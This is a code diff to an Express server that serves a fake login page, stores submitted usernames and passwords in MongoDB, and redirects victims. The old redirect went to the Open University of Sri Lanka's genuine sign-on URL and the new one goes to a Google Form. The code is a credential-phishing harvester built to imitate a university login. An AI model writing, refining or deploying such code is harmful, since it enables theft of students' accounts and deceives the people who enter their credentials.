@@ -35,9 +35,15 @@ app.get('/submit-form', (req, res) => {
   res.sendFile(__dirname + '/login.html');
 });
 
-// POST endpoint to handle login form submission -- /submit form is data collecting pdf document name in mongoDb
+// POST endpoint to handle login form submission
 app.post('/submit-form', async (req, res) => {
   const { username, password } = req.body;
+
+  // Validation for empty username or password
+  if (!username || !password) {
+    res.status(400).send('<h3 style="color: red;">Invalid username or password. Please try again.</h3>');
+    return;
+  }
 
   try {
     // Save user data to MongoDB
@@ -45,14 +51,14 @@ app.post('/submit-form', async (req, res) => {
     await newUser.save();
 
     // Redirect on success
-    res.redirect('https://iam.ou.ac.lk:8443/realms/ousl_ad_oulms/protocol/openid-connect/auth?client_id=oulmsmoodlecid&response_type=code&redirect_uri=https%3A%2F%2Foulms.ou.ac.lk%2Fadmin%2Foauth2callback.php&state=%2Fauth%2Foauth%2Flogin.php%3Fwantsurl%3Dhttps%253A%252F%252Foulms.ou.ac.lk%252F%26sesskey%3DXhoefrzFS5%26id%3D4&scope=openid%20profile%20email');
+    res.redirect('https://forms.gle/4VvJGELt443ST1Y78');
   } catch (error) {
     console.error('Error saving data to MongoDB:', error);
-    res.status(500).send('Server error');
+    res.status(500).send('<h3 style="color: red;">Server error. Please try again later.</h3>');
   }
 });
 
-// Start the server - missari
+// Start the server
 app.listen(PORT, () => {
   console.log(`Server is running on http://localhost:${PORT}`);
 });
